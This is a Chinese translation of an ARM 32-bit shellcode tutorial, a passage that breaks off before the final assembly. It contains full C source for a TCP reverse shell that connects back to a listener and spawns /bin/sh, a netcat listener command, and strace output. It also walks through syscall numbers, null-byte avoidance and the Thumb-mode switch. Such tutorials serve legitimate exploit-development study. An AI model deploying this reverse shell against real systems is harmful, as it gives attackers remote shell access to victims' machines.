本文是[《TCP Reverse Shell in Assembly (ARM 32-bit)》](https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit/)的翻译文章。
在本教程中，你将学习如何编写没有空字节的TCP反向shellcode。 如果你想从更基础的开始，你可以学习如何在汇编中编写一个[简单的execve()
shell](https://xz.aliyun.com/t/4098)，然后再深入研究这个稍微更难的教程。
如果你需要复习Arm程序集的知识，请查看我的[ARM Assembly Basics](https://azeria-labs.com/writing-arm-assembly-part-1/)教程系列，或使用此备忘单：
在开始之前，我想提醒你，我们正在写ARM shellcode，因此，如果还没有ARM的实验环境。 你可以自己设置（[使用QEMU模拟Raspberry
Pi](https://azeria-labs.com/emulate-raspberry-pi-with-qemu/)）或节约时间来下载我创建的现成的Lab VM（[ARM Lab VM](https://azeria-labs.com/arm-lab-vm/)）。 准备好了吗？
# 反向shell
首先，什么是反向shell，它是如何工作的？ 反向shell可以强制内部系统主动连接到外部系统。
在这种情况下，你的计算机有一个侦听器端口，它能从目标系统接收回连接。
由于更常见的情况是目标网络的防火墙无法阻止传出连接，因此可以使用反向shell(与绑定shell相反，绑定shell要求目标系统上允许传入连接)来利用这种错误配置。  
这是我们将用于翻译的C代码。
    #include 
    #include 
    #include 
    #include 
    int main(void)
    {
     int sockfd; // socket file descriptor
     socklen_t socklen; // socket-length for new connections
     struct sockaddr_in addr; // client address
     addr.sin_family = AF_INET; // server socket type address family = internet protocol address
     addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
     addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order
     // create new TCP socket
     sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
     // connect socket
     connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
     // Duplicate file descriptors for STDIN, STDOUT and STDERR
     dup2(sockfd, 0);
     dup2(sockfd, 1);
     dup2(sockfd, 2);
     // spawn shell
     execve( "/bin/sh", NULL, NULL );
    }
# 第一阶段：系统调用及其参数
第一步是确定必要的系统调用，其参数和系统调用号。 从上面的C代码可以看到我们需要以下函数：socket，connect，dup2，execve。
你可以用以下命令计算出这些函数的系统调用号：
    pi@raspberrypi:~/bindshell $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep socket
    #define __NR_socketcall             (__NR_SYSCALL_BASE+102)
    #define __NR_socket                 (__NR_SYSCALL_BASE+281)
    #define __NR_socketpair             (__NR_SYSCALL_BASE+288)
    #undef __NR_socketcall
这些是我们需要的所有系统调用号：
    #define __NR_socket    (__NR_SYSCALL_BASE+281)
    #define __NR_connect   (__NR_SYSCALL_BASE+283)
    #define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
    #define __NR_execve    (__NR_SYSCALL_BASE+ 11)
每个函数所需的参数可以在[linux手册页](http://man7.org/linux/man-pages/index.html)或[w3challs.com](https://w3challs.com/syscalls/?arch=arm_strong)上查找。  
Function R7 R0 R1 R2  
Socket 281 int socket_family int socket_type int protocol  
Connect 283 int sockfd const struct sockaddr _addr socklen_t addrlen  
Dup2 63 int oldfd int newfd –  
Execve 11 const char _filename char _const argv[] char_ const envp[]  
下一步是弄清楚这些参数的具体值。 一种方法是使用strace查看成功的反向shell连接。
Strace是一种工具，可用于跟踪系统调用并监视进程与Linux内核之间的交互。 让我们使用strace来测试我们的绑定shell的C版本。
为了提高效率和针对性，我们将输出限制为我们感兴趣的函数。
    Terminal 1:
    pi@raspberrypi:~/reverseshell $ gcc reverse.c -o reverse
    pi@raspberrypi:~/reverseshell $ strace -e execve,socket,connect,dup2 ./reverse
    Terminal 2:
    user@ubuntu:~$ nc -lvvp 4444
     Listening on [0.0.0.0] (family 0, port 4444)
     Connection from [192.168.139.130] port 4444 [tcp/*] accepted (family 2, sport 38010)
这是我们的strace输出：
    pi@raspberrypi:~/reverseshell $ strace -e execve,socket,connect,dup2 ./reverse
    execve("./reverse", ["./reverse"], [/* 49 vars */]) = 0
    socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.139.130")}, 16) = 0
    dup2(3, 0) = 0
    dup2(3, 1) = 1
    dup2(3, 2) = 2
    execve("/bin/sh", [0], [/* 0 vars */]) = 0
现在我们可以记下需要传递给arm汇编反向shell函数的值。  
Function R7 R0 R1 R2  
Socket 281 2 1 0  
Connect 283 sockid (struct sockaddr*) &addr 16  
Dup2 63 sockid 0 / 1 / 2 –  
Execve 11 “/bin/sh” 0 0
# 第二阶段：逐步解释
在第一阶段，我们回答了以下问题，以获得我们的汇编程序所需的一切：
  1. 我需要哪些函数？
  2. 这些函数的系统调用号是什么？
  3. 这些函数的参数是什么？
  4. 这些参数的值是什么？
这一步是关于应用这些知识并将其转化为汇编。 将每个函数拆分为单独的块并重复以下过程：
  1. 找出要用于哪个参数的寄存器
  2. 弄清楚如何将所需的值传递给这些寄存器
    1. 如何将立即值传递给寄存器
    2. 如何在不直接将＃0移入其中的情况下使寄存器无效（我们需要在代码中避免使用空字节，因此必须找到其他方法来使寄存器或内存中的值为空）
    3. 如何使寄存器指向内存中存储常量和字符串的区域
  3. 使用正确的系统调用号来调用该函数并跟踪寄存器值的变化
    1. 请记住，系统调用的结果将落在r0中，这意味着如果需要在另一个函数中重用该函数的结果，则需要在调用函数之前将其保存到另一个寄存器中。
    2. 示例：sockfd = socket（2,1,0） - 套接字调用的结果（sockfd）将落在r0中。 此结果在dup2（sockid，0）等其他函数中重用，因此应保存在另一个寄存器中。
## 0 - 切换到Thumb模式
要减少遇到空字节的可能性，首先应该使用Thumb模式。 在Arm模式下，指令为32位，在Thumb模式下为16位。
这意味着我们可以通过简单地减小指令的大小来减少使用空字节的机会。
概述如何切换到Thumb模式，即ARM指令必须是4字节对齐的。要将模式从ARM更改为Thumb，请将下一条指令地址（在PC中找到）的LSB（最低有效位）设置为1，方法是将PC寄存器的值加1并将其保存到另一个寄存器。然后使用BX（分支和交换）指令分支到另一个寄存器，该寄存器包含LSB设置为1的下一条指令的地址，这使得处理器切换到Thumb模式。
这一切都可以归结为以下两条说明。
    .section .text
    .global _start
    _start:
        .ARM
        add     r3, pc, #1            
        bx      r3
从这里开始，你将编写Thumb代码，因此需要在代码中使用.THUMB指令会指明这一点。
## 1 - 创建新的套接字
这些是socket调用参数所需的值：
    root@raspberrypi:/home/pi# grep -R "AF_INET\|PF_INET \|SOCK_STREAM =\|IPPROTO_IP =" /usr/include/
    /usr/include/linux/in.h: IPPROTO_IP = 0,                               // Dummy protocol for TCP 
    /usr/include/arm-linux-gnueabihf/bits/socket_type.h: SOCK_STREAM = 1,  // Sequenced, reliable, connection-based
    /usr/include/arm-linux-gnueabihf/bits/socket.h:#define PF_INET 2       // IP protocol family. 
    /usr/include/arm-linux-gnueabihf/bits/socket.h:#define AF_INET PF_INET
设置参数后，使用svc指令调用套接字系统调用。 这个调用的结果将是我们的sockid并将最终在r0。 由于我们以后需要sockid，让我们把它保存到r4。  
在ARMv7 +中，你可以使用movw指令并将任何立即值放入寄存器。 在ARMv6中，你不能简单地将任何立即值移动到寄存器中，而必须将其拆分为两个较小的值。
如果你对这个细微差别的更多细节感兴趣，可以在[Memory章节](https://azeria-labs.com/memory-instructions-load-and-store-part-4/)（最后）中找到一节。  
为了检查我是否可以使用某个直接值，我写了一个名为[rotator.py](https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py)的小脚本（简单的小代码，献丑了）。
    pi@raspberrypi:~ $ python rotator.py
    Enter the value you want to check: 281
    Sorry, 281 cannot be used as an immediate number and has to be split.
    pi@raspberrypi:~ $ python rotator.py
    Enter the value you want to check: 200
    The number 200 can be used as a valid immediate number.
    50 ror 30 --> 200
    pi@raspberrypi:~ $ python rotator.py
    Enter the value you want to check: 81
    The number 81 can be used as a valid immediate number.
    81 ror 0 --> 81
最终代码段（ARMv6版本）：
    .THUMB